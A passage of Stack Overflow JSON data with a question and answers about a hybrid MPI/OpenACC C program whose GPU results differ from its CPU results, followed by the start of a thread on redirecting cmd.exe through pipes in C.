toolchain:</p>\n\n<pre><code>$ /opt/pgi/linux86-64/15.7/mpi/mpich/bin/mpicc t2.c -o t2 -lmpi\nPGC-W-0129-Floating point overflow. Check constants and constant expressions (t2.c: 88)\nPGC-W-0129-Floating point overflow. Check constants and constant expressions (t2.c: 142)\nPGC-W-0129-Floating point overflow. Check constants and constant expressions (t2.c: 143)\nPGC-W-0129-Floating point overflow. Check constants and constant expressions (t2.c: 308)\nPGC/x86-64 Linux 15.7-0: compilation completed with warnings\n$ LD_LIBRARY_PATH=/opt/pgi/linux86-64/15.7/mpi/mpich/lib /opt/pgi/linux86-64/15.7/mpi/mpich/bin/mpirun -n 1 ./t2 input.vti output1rank\nPE: [0] - performing sweep number ..... [1/8]\nPE: [0] - completed sweep number ...... [1/8]\nPE: [0] - performing sweep number ..... [2/8]\nPE: [0] - completed sweep number ...... [2/8]\nPE: [0] - performing sweep number ..... [3/8]\nPE: [0] - completed sweep number ...... [3/8]\nPE: [0] - performing sweep number ..... [4/8]\nPE: [0] - completed sweep number ...... [4/8]\nPE: [0] - performing sweep number ..... [5/8]\nPE: [0] - completed sweep number ...... [5/8]\nPE: [0] - performing sweep number ..... [6/8]\nPE: [0] - completed sweep number ...... [6/8]\nPE: [0] - performing sweep number ..... [7/8]\nPE: [0] - completed sweep number ...... [7/8]\nPE: [0] - performing sweep number ..... [8/8]\nPE: [0] - completed sweep number ...... [8/8]\noutput1rank file created\n$ LD_LIBRARY_PATH=/opt/pgi/linux86-64/15.7/mpi/mpich/lib /opt/pgi/linux86-64/15.7/mpi/mpich/bin/mpirun -n 2 ./t2 input.vti output2rank\nPE: [0] - performing sweep number ..... [1/8]\nPE: [1] - performing sweep number ..... [2/8]\nPE: [1] - completed sweep number ...... [2/8]\nPE: [1] - performing sweep number ..... [4/8]\nPE: [0] - completed sweep number ...... [1/8]\nPE: [0] - performing sweep number ..... [3/8]\nPE: [1] - completed sweep number ...... [4/8]\nPE: [1] - performing sweep number ..... [6/8]\nPE: [0] - completed sweep number ...... [3/8]\nPE: [0] - performing sweep number ..... [5/8]\nPE: [1] - completed sweep number ...... [6/8]\nPE: [1] - performing sweep number ..... [8/8]\nPE: [1] - completed sweep number ...... [8/8]\nPE: [0] - completed sweep number ...... [5/8]\nPE: [0] - performing sweep number ..... [7/8]\nPE: [0] - completed sweep number ...... [7/8]\noutput2rank file created\n$ diff -q output1rank.txt output2rank.txt\nFiles output1rank.txt and output2rank.txt differ\n$\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 31, "user_id": 5490028, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2d5079b88163432216fa05b7203f5511?s=128&d=identicon&r=PG", "display_name": "Stephane Chauveau", "link": "https://stackoverflow.com/users/5490028/stephane-chauveau"}, "edited": false, "score": 1, "creation_date": 1445876458, "post_id": 33350546, "comment_id": 54496619, "body": "Also, be careful with the min() and max() macros. Without proper () it is easy to get hit by a nasty precedence bug. #define min(a,b) (((a)&lt;(b))?(b):(a))"}, {"owner": {"reputation": 217, "user_id": 4581734, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/oJcyy.jpg?s=128&g=1", "display_name": "anupshrestha", "link": "https://stackoverflow.com/users/4581734/anupshrestha"}, "edited": false, "score": 0, "creation_date": 1445962360, "post_id": 33350546, "comment_id": 54540384, "body": "Thank you @Stephane for looking into this and finding a solution for me to work with <code>pgcc</code>. I think for now I will stick to <code>pgc++</code> but will take your suggestions into consideration and refactor my code."}], "tags": [], "owner": {"reputation": 31, "user_id": 5490028, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2d5079b88163432216fa05b7203f5511?s=128&d=identicon&r=PG", "display_name": "Stephane Chauveau", "link": "https://stackoverflow.com/users/5490028/stephane-chauveau"}, "is_accepted": false, "score": 2, "last_activity_date": 1445876108, "creation_date": 1445876108, "answer_id": 33350546, "question_id": 33130676, "link": "https://stackoverflow.com/questions/33130676/writing-a-hybrid-mpi-openacc-program/33350546#33350546", "title": "Writing a hybrid MPI/OpenACC program", "body": "<p>I believe that this could a bug in pgcc (but not in pgc++).</p>\n\n<p>After some experiments, I came to the conclusion that the numbers of iterations of the x and y loops are probably computed incorrectly probably because the compiler is attempting an illegal optimization (or a stack corruption?).  </p>\n\n<p>I was able to get a proper result with 'pgcc -acc' after applying the following transformation to the code given in the 1st Answer.</p>\n\n<pre><code>xs = max(1, level-(s-&gt;yDim + s-&gt;zDim))    , ys = max(1,level-(s-&gt;xDim + s-&gt;zDim));\nxe = min(s-&gt;xDim, level-(s-&gt;firstLevel-1)), ye = min(s-&gt;yDim, level-(s-&gt;firstLevel-1));\n----&gt;\nif (level != 99999) {\n xs = max(1, level-(s-&gt;yDim + s-&gt;zDim))    , ys = max(1,level-(s-&gt;xDim + s-&gt;zDim));\n xe = min(s-&gt;xDim, level-(s-&gt;firstLevel-1)), ye = min(s-&gt;yDim, level-(s-&gt;firstLevel-1));\n}\n</code></pre>\n\n<p>The additional IF is of course always TRUE but the compiler has no ways to know that so this is enough to prevent most optimization attempts.</p>\n\n<p>PS: I also recommend to replace the comma between the assignments by a semi-column. The comma has higher precedence than the assignment so this is not wrong but just a bit disturbing.</p>\n"}], "owner": {"reputation": 217, "user_id": 4581734, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/oJcyy.jpg?s=128&g=1", "display_name": "anupshrestha", "link": "https://stackoverflow.com/users/4581734/anupshrestha"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 807, "favorite_count": 0, "accepted_answer_id": 33249431, "answer_count": 2, "score": 0, "last_activity_date": 1445876108, "creation_date": 1444839772, "last_edit_date": 1445532634, "question_id": 33130676, "link": "https://stackoverflow.com/questions/33130676/writing-a-hybrid-mpi-openacc-program", "title": "Writing a hybrid MPI/OpenACC program", "body": "<p>I am trying to write a hybrid MPI/OpenACC code, where the code needs to do 8 different jobs (in this case 8 different sweeps). These 8 jobs are divided to [1-8] processes/nodes using MPI and the calculations that needs to be done within the 8 jobs are parallelized using OpenACC.</p>\n\n<p>After each process is done with its calculations, I reduce the solution and pass the minimum to the process 0 which is the final solution.</p>\n\n<p>Below is a MCVE of the full code (test.c) that produces a .txt output file</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n#include &lt;string.h&gt;\n#include \"mpi.h\"\n\n#define min(a,b) (a &gt; b) ? b : a\n#define max(a,b) (a &lt; b) ? b : a\n\n#define NPES 8 // max number of PEs allowed\n#define DEFAULT_BORDER_LOCATION   -1\n#define DEFAULT_BORDER_DISTANCE   INFINITY\n#define DEFAULT_INTERIOR_DISTANCE 90000\n\ntypedef struct {\n  int order;\n  int firstLevel, lastLevel, level;\n  int xDim, yDim, zDim;\n  int xSweepOff, ySweepOff, zSweepOff;\n  double dx, dy, dz;\n} SweepInfo;\n\ntypedef struct {\n  double   dx, dy, dz;\n  int * location;\n  double * distance;\n} Phi;\n\ntypedef struct {\n  int x, y, z;\n} Grid3D;\n\n\n\nvoid calc_dist_field( Phi * p, int totalNodes );\nvoid write_to_file(double * dist);\nstatic SweepInfo make_sweepInfo( Phi * p, int my_rank );\nstatic void fast_sweep( Phi * p, SweepInfo * s );\nstatic double solveEikonal(Phi * p, int index, int max_x, int max_y);\nstatic void update_distance(Phi * p, int totalNodes);\nstatic void set_distance_negative_inside(Phi * p, int totalNodes);\nstatic void adjust_boundary( Phi * p );\n\n\n// public method declarations\nGrid3D make_grid3D(int x, int y, int z);\nvoid vti_get_dimensions(FILE *vti, double *d);\nvoid vti_get_data(FILE *vti, int *l, int b_l, double *d, double b_d, Grid3D g);\n\n// private method declarations\nstatic void move_file_pointer(FILE *file_ptr, int lineNumber, int r);\nstatic void get_location(FILE *vti, int *l, int b_l, Grid3D g);\nstatic void get_distance(FILE *vti, double *d, double b_d, Grid3D g);\n\nstatic int npes;          // Number of PEs\nstatic int my_rank;       // Rank of the PE\nstatic char * fileName;\nstatic char * outfileName;\n\nstatic int NX, NY, NZ, totalNodes;\n\nint main(int argc, char *argv[]) {\n\n  // MPI startup routine\n  MPI_Init(&amp;argc, &amp;argv);\n  MPI_Comm_rank(MPI_COMM_WORLD, &amp;my_rank);\n  MPI_Comm_size(MPI_COMM_WORLD, &amp;npes);\n\n  fileName    = argv[1];\n  outfileName = argv[2];\n  FILE *f = fopen(fileName, \"r\");\n\n  double dims[6];\n  vti_get_dimensions(f, dims);\n  NX = dims[0] + 3;\n  NY = dims[1] + 3;\n  NZ = dims[2] + 3;\n\n  totalNodes = NX * NY * NZ;\n  Phi *p = (Phi *) malloc(sizeof(Phi));\n  p-&gt;location = (int *) malloc(sizeof(int) * totalNodes);\n  p-&gt;distance = (double *) malloc(sizeof(double) * totalNodes);\n\n  p-&gt;dx = dims[3]; p-&gt;dy = dims[4]; p-&gt;dz = dims[5];\n\n  vti_get_data( f, p-&gt;location, DEFAULT_BORDER_LOCATION,\n                   p-&gt;distance, DEFAULT_BORDER_DISTANCE,\n                make_grid3D(NX, NY, NZ));\n\n\n  update_distance(p, totalNodes);\n\n  calc_dist_field(p, totalNodes);\n\n  MPI_Finalize();\n  return 0;\n}\n\nvoid calc_dist_field( Phi * p, int totalNodes ) {\n\n  int sweepNumber = my_rank + 1;\n  double * tmp_dist;\n\n  MPI_Barrier(MPI_COMM_WORLD);\n  if(my_rank == 0){\n    tmp_dist = (double *) malloc( totalNodes * sizeof(double) );\n  }\n\n  // sn represents the sweep number\n  for( int sn = sweepNumber; sn &lt;= NPES; sn += npes) {\n    SweepInfo s = make_sweepInfo(p, sn);\n\n    printf(\"PE: [%d] - performing sweep number ..... [%d/%d]\\n\", my_rank, sn, NPES);\n\n    fast_sweep(p, &amp;s);\n\n    printf(\"PE: [%d] - completed sweep number ...... [%d/%d]\\n\", my_rank, sn, NPES);\n\n  }\n\n  MPI_Barrier(MPI_COMM_WORLD);\n  #pragma acc update host(p-&gt;distance[0:totalNodes])\n  MPI_Reduce(p-&gt;distance, tmp_dist, totalNodes, MPI_DOUBLE, MPI_MIN, 0, MPI_COMM_WORLD);\n\n  if( my_rank == 0 ) {\n    free( p-&gt;distance );\n    p-&gt;distance = tmp_dist;\n    set_distance_negative_inside(p, totalNodes);\n    adjust_boundary(p);\n    write_to_file(p-&gt;distance);\n    printf(\"%s file created\\n\", outfileName);\n  }\n\n}\n\nstatic void update_distance(Phi * p, int totalNodes) {\n\n  int    *l = &amp;p-&gt;location[0];\n  double *d = &amp;p-&gt;distance[0];\n\n  for(int i = 0; i &lt; totalNodes; i++) {\n    if(*l != DEFAULT_BORDER_LOCATION &amp;&amp; *d != DEFAULT_BORDER_DISTANCE ) {\n      *d = (*l == 1 &amp;&amp; *d == INFINITY) ? -1 : (*d &gt; 0.0 || *d &lt; 0.0) ? *d : DEFAULT_INTERIOR_DISTANCE;\n    }\n    l++; d++;\n  }\n\n}\n\n\n\nvoid write_to_file(double * dist) {\n\n  int x = NX;\n  int y = NY;\n  int z = NZ;\n  char fname[255];\n  sprintf(fname, \"%s.txt\", outfileName);\n  FILE *fp = fopen(fname, \"w\");\n\n  int i,j,k;\n  double *t = &amp;dist[0];\n  for(i = 0; i &lt; z; i++){\n    for(j = 0; j &lt; y; j++){\n      for(k = 0; k &lt; x; k++) {\n    fprintf(fp, \"%f  \", *(t++));\n      }\n      fprintf(fp, \"\\n\");\n    }\n    fprintf(fp, \"\\n\");\n  }\n\n}\n\n\nstatic SweepInfo make_sweepInfo( Phi * p, int my_rank ) {\n  SweepInfo s;\n\n  s.order      = my_rank;\n  s.firstLevel = 3;\n  s.lastLevel  = (NX + NY + NZ) - 6;\n\n  s.xDim = NX-2; s.dx = p-&gt;dx;\n  s.yDim = NY-2; s.dy = p-&gt;dy;\n  s.zDim = NZ-2; s.dz = p-&gt;dz;\n\n  s.xSweepOff = (s.order == 4 || s.order == 8 ) ? s.xDim + 1 : 0;\n  s.ySweepOff = (s.order == 2 || s.order == 6 ) ? s.yDim + 1 : 0;\n  s.zSweepOff = (s.order == 3 || s.order == 7 ) ? s.zDim + 1 : 0;\n\n  return s;\n}\n\nstatic void fast_sweep( Phi * p, SweepInfo * s ) {\n\n  int start, end, incr;\n\n  start = ( s-&gt;order == 2 || s-&gt;order == 5 || s-&gt;order == 7 || s-&gt;order == 8 ) ? s-&gt;lastLevel : s-&gt;firstLevel;\n\n  if ( start == s-&gt;firstLevel ) {\n    end  = s-&gt;lastLevel + 1;\n    incr = 1;\n  }\n  else {\n    end  = s-&gt;firstLevel - 1;\n    incr = 0;\n  }\n\n  int max_x  = s-&gt;xDim + 2;\n  int max_y  = s-&gt;yDim + 2;\n  int max_xy = max_x * max_y;\n\n  #pragma acc data create(p[0:1]) copy(p-&gt;distance[0:totalNodes])\n  for(int level = start; level != end; level = (incr) ? level+1 : level-1) {\n    // s - start, e - end\n    int xs, xe, ys, ye;\n\n    xs = max(1, level-(s-&gt;yDim + s-&gt;zDim))    , ys = max(1,level-(s-&gt;xDim + s-&gt;zDim));\n    xe = min(s-&gt;xDim, level-(s-&gt;firstLevel-1)), ye = min(s-&gt;yDim, level-(s-&gt;firstLevel-1));\n\n    int x, y, z, i, j, k, index;\n    #pragma acc parallel\n    {\n      #pragma acc loop independent\n      for(x = xs; x &lt;= xe; x++) {\n        #pragma acc loop independent\n        for(y = ys; y &lt;= ye; y++) {\n          z = level - (x+y);\n          if(z &gt; 0 &amp;&amp; z &lt;= NZ-2) {\n            i = abs(z-s-&gt;zSweepOff);\n            j = abs(y-s-&gt;ySweepOff);\n            k = abs(x-s-&gt;xSweepOff);\n            index = i * max_xy + j * max_x + k;\n            p-&gt;distance[index] = solveEikonal(p, index, NX, NY);\n          }\n        }\n      } // end of acc parallel\n    }\n  }\n}\n\n#pragma acc routine seq\nstatic double solveEikonal(Phi * p, int index, int max_x, int max_y) {\n\n  int max_xy = max_x * max_y;\n\n  double dist_new = 0;\n  double dist_old = p-&gt;distance[index];\n\n  double dx = p-&gt;dx, dy = p-&gt;dy, dz = p-&gt;dz;\n  double minX = min(p-&gt;distance[index-1], p-&gt;distance[index+1]);\n  double minY = min(p-&gt;distance[abs(index-max_x)], p-&gt;distance[abs(index+max_x)]);\n  double minZ = min(p-&gt;distance[abs(index-max_xy)],p-&gt;distance[abs(index+max_xy)]);\n\n  double m[] = { minX, minY, minZ} ;\n  double d[] = { dx, dy, dz};\n\n  // sort the mins \n  for(int i = 1; i &lt; 3; i++){\n    for(int j = 0; j &lt; 3-i; j++) {\n      if(m[j] &gt; m[j+1]) {\n        double tmp_m = m[j];\n        double tmp_d = d[j];\n        m[j] = m[j+1]; d[j] = d[j+1];\n        m[j+1] = tmp_m; d[j+1] = tmp_d;\n      }\n    }\n  }\n\n  // simplifying the variables\n  double m_0 = m[0], m_1 = m[1], m_2 = m[2];\n  double d_0 = d[0], d_1 = d[1], d_2 = d[2]; \n  double m2_0 = m_0 * m_0, m2_1 = m_1 * m_1, m2_2 = m_2 * m_2;\n  double d2_0 = d_0 * d_0, d2_1 = d_1 * d_1, d2_2 = d_2 * d_2;\n\n  dist_new = m_0 + d_0;\n  if(dist_new &gt; m_1) {\n\n    double s = sqrt(- m2_0 + 2 * m_0 * m_1 - m2_1 + d2_0 + d2_1); \n    dist_new = ( m_1 * d2_0 + m_0 * d2_1 + d_0 * d_1 * s) / (d2_0 + d2_1);\n\n    if(dist_new &gt; m_2) {\n\n      double a = sqrt(- m2_0 * d2_1 - m2_0 * d2_2 + 2 * m_0 * m_1 * d2_2\n                      - m2_1 * d2_0 - m2_1 * d2_2 + 2 * m_0 * m_2 * d2_1\n                      - m2_2 * d2_0 - m2_2 * d2_1 + 2 * m_1 * m_2 * d2_0\n                      + d2_0 * d2_1 + d2_0 * d2_2 + d2_1 * d2_2);\n\n      dist_new = (m_2 * d2_0 * d2_1 + m_1 * d2_0 * d2_2 + m_0 * d2_1 * d2_2 + d_0 * d_1 * d_2 * a) /\n                  (d2_0 * d2_1 + d2_0 * d2_2 + d2_1 * d2_2);\n    }\n  }\n\n  return min(dist_old, dist_new);\n}\n\n\n\nstatic void set_distance_negative_inside(Phi * p, int totalNodes) {\n\n  int    *l = &amp;p-&gt;location[0];\n  double *d = &amp;p-&gt;distance[0];\n\n  for(int i = 0; i &lt; totalNodes; i++) {\n    if(*l != DEFAULT_BORDER_LOCATION &amp;&amp; *d != DEFAULT_BORDER_DISTANCE ) {\n      if( *l == 1) *d = -1;\n    }\n    l++; d++;\n  }\n\n}\n\nstatic void adjust_boundary( Phi * p ) {\n\n  int x, y, z, xy, i, j, k;\n  x  = NX;\n  y  = NY;\n  z  = NZ;\n  xy = x * y;\n\n  for(i = 0; i &lt; z; i++){\n    for(j = 0; j &lt; y; j++){\n      for(k = 0; k &lt; x; k++){\n        int I = i, J = j, K = k;\n        I = (i == z-1) ? I-1 : (!i) ? I+1 : I;\n        J = (j == y-1) ? J-1 : (!j) ? J+1 : J;\n        K = (k == x-1) ? K-1 : (!k) ? K+1 : K;\n        if( i != I || j != J || k != K) {\n            int l_index = i * xy + j * x + k;\n            int r_index = I * xy + J * x + K;\n            p-&gt;distance[l_index] = p-&gt;distance[r_index];\n        }\n      }\n    }\n  }\n}\n\n\n\n/**************** vti_parser ********************************/\n\nstatic void move_file_pointer(FILE *file_ptr, int lineNumber, int r) {\n    char tmpStr[512];\n    if(r) rewind(file_ptr);\n    while (lineNumber &gt; 0){\n        fgets (tmpStr, 511, file_ptr);\n        lineNumber--;\n    }\n}\n\nvoid vti_get_dimensions(FILE *vti, double *d) {\n    char tmpStr[512];\n    rewind(vti);\n    while (1) {\n        fgets (tmpStr, 511, vti);\n        if ( strstr(tmpStr, \"ImageData WholeExtent\") ) {\n            sscanf(tmpStr, \"    &lt;ImageData WholeExtent=\\\"0 %lf 0 %lf 0 %lf\\\" Spacing=\\\"%lf %lf %lf\\\"&gt;\",\n                    &amp;d[0], &amp;d[1], &amp;d[2], &amp;d[3], &amp;d[4], &amp;d[5]);\n            break;\n        }\n    }\n}\n\n\nvoid vti_get_data(FILE *vti, int *l, int b_l, double *d, double b_d, Grid3D g) {\n\n    // move the file pointer to\n    // line 6 from beginning\n    move_file_pointer(vti, 6, 1);\n\n    get_location(vti, l, b_l, g);\n\n    // move the file pointer 2 lines\n    // forward from its last position\n    move_file_pointer(vti, 2, 0);\n\n    get_distance(vti, d, b_d, g);\n\n}\n\nstatic void get_location(FILE *vti, int *l, int b_l, Grid3D g) {\n    int i, j, k, *t = &amp;l[0];\n    for (i = 0; i &lt; g.z; i++){\n        for (j = 0; j &lt; g.y; j++) {\n            for (k = 0; k &lt; g.x; k++) {\n                // Border\n                if (k == 0 || k == g.x-1 || j == 0 || j == g.y-1 || i == 0 || i == g.z-1 ) {\n                    *(t++) = b_l;\n                }\n                else{ // Interior\n                    fscanf(vti, \"%d \", t++);\n                }\n            }\n        }\n    }\n}\n\n\n\nstatic void get_distance(FILE *vti, double *d, double b_d, Grid3D g) {\n    int i, j, k;\n    double *t = &amp;d[0];\n    for (i = 0; i &lt; g.z; i++){\n        for (j = 0; j &lt; g.y; j++) {\n            for (k = 0; k &lt; g.x; k++) {\n                // Border distance\n                if (k == 0 || k == g.x-1 || j == 0 || j == g.y-1 || i == 0 || i == g.z-1 ) {\n                    *(t++) = b_d;\n                }\n                else{ // Interior distance\n                    fscanf(vti, \"%lf \", t++);\n                }\n            }\n        }\n    }\n}\n\nGrid3D make_grid3D(int x, int y, int z){\n    Grid3D g;\n    g.x = x; g.y = y; g.z = z;\n\n    return g;\n}\n</code></pre>\n\n<p>The code works when I discard the openacc directives and run it with [1-8] processes, but when using the open acc compiler I get a cudaError.</p>\n\n<p><code>call to cuStreamSynchronize returned error 700: Illegal address during kernel execution</code></p>\n\n<p>MPI compilation:</p>\n\n<pre><code>mpicc -Wall -g -std=c99 -I/cm/shared/apps/openmpi/gcc/64/1.8.5_wocuda/include -L/cm/shared/apps/openmpi/gcc/64/1.8.5_wocuda/lib -lmpi test.c -o mpi_exec.out\n</code></pre>\n\n<p>OpenACC compilation:</p>\n\n<pre><code>pgcc -acc -ta=tesla:managed -Minfo=accel -g -lm -I/cm/shared/apps/openmpi/gcc/64/1.8.5_wocuda/include -L/cm/shared/apps/openmpi/gcc/64/1.8.5_wocuda/lib -lmpi test.c -o oacc_exec.out\n</code></pre>\n\n<p>To run the executable you need to pass in an input vti file and the output filename.</p>\n\n<pre><code>mpirun -np &lt;1-8&gt; &lt;executable&gt; input.vti outputName\n</code></pre>\n\n<p>Link to the input file <a href=\"https://drive.google.com/file/d/0B9Sh1CrE94jfUlBGT2o3Z0NQUG8/view?usp=sharing\" rel=\"nofollow\">input.vti</a></p>\n\n<p>I want this code to be very flexible, i want to make it so that it can run on a single node with 1 GPU while running [1-8] processes and also on [1-8] nodes with each node having [1-2] GPUS. And I am not using CUDA MPS.</p>\n\n<p>My specifications</p>\n\n<pre><code>GNU/Linux x86_64\nNVIDIA GeForce GTX Titan CC: 3.5\n\npgcc 15.7-0 64-bit target on x86-64 Linux -tp sandybridge \ngcc (GCC) 4.8.1\n</code></pre>\n\n<p>Any help or suggestions on this will be much appreciated.</p>\n\n<p><strong>EDIT:</strong></p>\n\n<pre><code>** Compiling with OpenACC\n\n`$ pgcc -fast -ta=tesla:managed -Minfo=accel -   I/cm/shared/apps/openmpi/gcc/64/1.8.5_wocuda/include -L/cm/shared/apps/openmpi/gcc/64/1.8.5_wocuda/lib -lmpi rcrovella.c -o withacc\nPGC-W-0129-Floating point overflow. Check constants and constant expressions (rcrovella.c: 88)\nPGC-W-0129-Floating point overflow. Check constants and constant expressions (rcrovella.c: 142)\nPGC-W-0129-Floating point overflow. Check constants and constant expressions (rcrovella.c: 143)\nPGC-W-0129-Floating point overflow. Check constants and constant expressions (rcrovella.c: 308)\nfast_sweep:\n    225, Generating copy(p[:1])\n    228, Loop is parallelizable\n    230, Loop is parallelizable\n         Accelerator kernel generated\n         Generating Tesla code\n        228, #pragma acc loop gang /* blockIdx.y */\n        230, #pragma acc loop gang, vector(128) /* blockIdx.x threadIdx.x */\nsolveEikonal:\n    246, Generating acc routine seq\n    262, Loop is parallelizable\n    263, Loop carried dependence of m prevents parallelization\n         Loop carried backward dependence of m prevents vectorization\n         Loop carried dependence of d prevents parallelization\n         Loop carried backward dependence of d prevents vectorization\nPGC/x86-64 Linux 15.7-0: compilation completed with warnings`\n\n** Compiling without OpenACC\npgcc -I/cm/shared/apps/openmpi/gcc/64/1.8.5_wocuda/include -L/cm/shared/apps/openmpi/gcc/64/1.8.5_wocuda/lib -lmpi rcrovella.c -o   noaccPGC-W-0129-Floating point overflow. Check constants and constant    expressions (rcrovella.c: 88)\nPGC-W-0129-Floating point overflow. Check constants and constant expressions (rcrovella.c: 142)\nPGC-W-0129-Floating point overflow. Check constants and constant expressions (rcrovella.c: 143)\nPGC-W-0129-Floating point overflow. Check constants and constant expressions (rcrovella.c: 308)\nPGC/x86-64 Linux 15.7-0: compilation completed with warnings\n\n** Running with OpenACC\n$ mpirun -n 1 withacc ../my_test/input.vti withacc1\nPE: [0] - performing sweep number ..... [1/8]\nPE: [0] - completed sweep number ...... [1/8]\nPE: [0] - performing sweep number ..... [2/8]\nPE: [0] - completed sweep number ...... [2/8]\nPE: [0] - performing sweep number ..... [3/8]\nPE: [0] - completed sweep number ...... [3/8]\nPE: [0] - performing sweep number ..... [4/8]\nPE: [0] - completed sweep number ...... [4/8]\nPE: [0] - performing sweep number ..... [5/8]\nPE: [0] - completed sweep number ...... [5/8]\nPE: [0] - performing sweep number ..... [6/8]\nPE: [0] - completed sweep number ...... [6/8]\nPE: [0] - performing sweep number ..... [7/8]\nPE: [0] - completed sweep number ...... [7/8]\nPE: [0] - performing sweep number ..... [8/8]\nPE: [0] - completed sweep number ...... [8/8]\nwithacc1 file created\n\n** Running without OpenACC\n$ mpirun -n 1 noacc ../my_test/input.vti noacc1\nPE: [0] - performing sweep number ..... [1/8]\nPE: [0] - completed sweep number ...... [1/8]\nPE: [0] - performing sweep number ..... [2/8]\nPE: [0] - completed sweep number ...... [2/8]\nPE: [0] - performing sweep number ..... [3/8]\nPE: [0] - completed sweep number ...... [3/8]\nPE: [0] - performing sweep number ..... [4/8]\nPE: [0] - completed sweep number ...... [4/8]\nPE: [0] - performing sweep number ..... [5/8]\nPE: [0] - completed sweep number ...... [5/8]\nPE: [0] - performing sweep number ..... [6/8]\nPE: [0] - completed sweep number ...... [6/8]\nPE: [0] - performing sweep number ..... [7/8]\nPE: [0] - completed sweep number ...... [7/8]\nPE: [0] - performing sweep number ..... [8/8]\nPE: [0] - completed sweep number ...... [8/8]\nnoacc1 file created\n\n** Compare\n$ diff -q noacc1.txt withacc1.txt\nFiles noacc1.txt and withacc1.txt differ\n</code></pre>\n"}, {"tags": ["c", "windows", "cmd", "pipe"], "comments": [{"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1444840185, "post_id": 33130522, "comment_id": 54073250, "body": "in the function: <code>ReadFromPipe</code> the local variable <code>bSuccess</code> is set at each sub function call but is never used.  Your compiler should have told you of this problem.  When compiling, always enable all warnings, then fix the warnings.  (for gcc, at a minimum use: <code>-Wall -Wextra -pedantic</code> )"}, {"owner": {"reputation": 2000, "user_id": 4487286, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YHZoO.jpg?s=128&g=1", "display_name": "milevyo", "link": "https://stackoverflow.com/users/4487286/milevyo"}, "edited": false, "score": 0, "creation_date": 1444840735, "post_id": 33130522, "comment_id": 54073539, "body": "since you are using windows functions, instead of using the function CreateChildProcess(), use CreateProcess of windows, then you can replace the stdin, stdout and stderr handels. you will get more controls over it. there are many tutorial about that"}, {"owner": {"reputation": 83, "user_id": 5277702, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/a3b2ed5cf90661e8c84928ecd5705d01?s=128&d=identicon&r=PG&f=1", "display_name": "test123423", "link": "https://stackoverflow.com/users/5277702/test123423"}, "reply_to_user": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1444840747, "post_id": 33130522, "comment_id": 54073544, "body": "@user3629249 i know but its like i sayed the first 2 calls work...."}, {"owner": {"reputation": 83, "user_id": 5277702, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/a3b2ed5cf90661e8c84928ecd5705d01?s=128&d=identicon&r=PG&f=1", "display_name": "test123423", "link": "https://stackoverflow.com/users/5277702/test123423"}, "reply_to_user": {"reputation": 2000, "user_id": 4487286, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YHZoO.jpg?s=128&g=1", "display_name": "milevyo", "link": "https://stackoverflow.com/users/4487286/milevyo"}, "edited": false, "score": 0, "creation_date": 1444840942, "post_id": 33130522, "comment_id": 54073660, "body": "@milevyo uhhmmmm CreateChildProcess is defined in my source code and actually calls CreateProcess, and yes i defined hStdOutput etc , but thx"}], "answers": [{"comments": [{"owner": {"reputation": 2000, "user_id": 4487286, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YHZoO.jpg?s=128&g=1", "display_name": "milevyo", "link": "https://stackoverflow.com/users/4487286/milevyo"}, "edited": false, "score": 0, "creation_date": 1444841848, "post_id": 33131283, "comment_id": 54074193, "body": "use same thing with ReadFromPipe, check the success in main function"}], "tags": [], "owner": {"reputation": 2000, "user_id": 4487286, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YHZoO.jpg?s=128&g=1", "display_name": "milevyo", "link": "https://stackoverflow.com/users/4487286/milevyo"}, "is_accepted": false, "score": -1, "last_activity_date": 1444841718, "creation_date": 1444841718, "answer_id": 33131283, "question_id": 33130522, "link": "https://stackoverflow.com/questions/33130522/redirecting-cmd-exe-output-and-input-in-c-through-pipes/33131283#33131283", "title": "Redirecting CMD.exe output and input in c through pipes", "body": "<pre><code>int WriteToPipe(char* command){\n    DWORD dwRead, dwWritten;\n    BOOL bSuccess = FALSE;\n\n    bSuccess = WriteFile(g_hChildStd_IN_Wr, command, strlen(command), &amp;dwWritten, NULL);\n\n   return bSuccess ;\n}\n</code></pre>\n\n<p>close the handle in main() function since g_hChildStd_IN_Wr is global. also, <code>return bSuccess;</code> notify you if write to pipe has succeeded</p>\n"}, {"comments": [{"owner": {"reputation": 2000, "user_id": 4487286, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YHZoO.jpg?s=128&g=1", "display_name": "milevyo", "link": "https://stackoverflow.com/users/4487286/milevyo"}, "edited": false, "score": 0, "creation_date": 1444846615, "post_id": 33132689, "comment_id": 54076958, "body": "Remarque the udplicate output of the input, try to fix it;"}, {"owner": {"reputation": 2000, "user_id": 4487286, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YHZoO.jpg?s=128&g=1", "display_name": "milevyo", "link": "https://stackoverflow.com/users/4487286/milevyo"}, "reply_to_user": {"reputation": 83, "user_id": 5277702, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/a3b2ed5cf90661e8c84928ecd5705d01?s=128&d=identicon&r=PG&f=1", "display_name": "test123423", "link": "https://stackoverflow.com/users/5277702/test123423"}, "edited": false, "score": 0, "creation_date": 1444852380, "post_id": 33132689, "comment_id": 54080278, "body": "what was the result of testing it?"}, {"owner": {"reputation": 35031, "user_id": 1889329, "user_type": "registered", "accept_rate": 71, "profile_image": 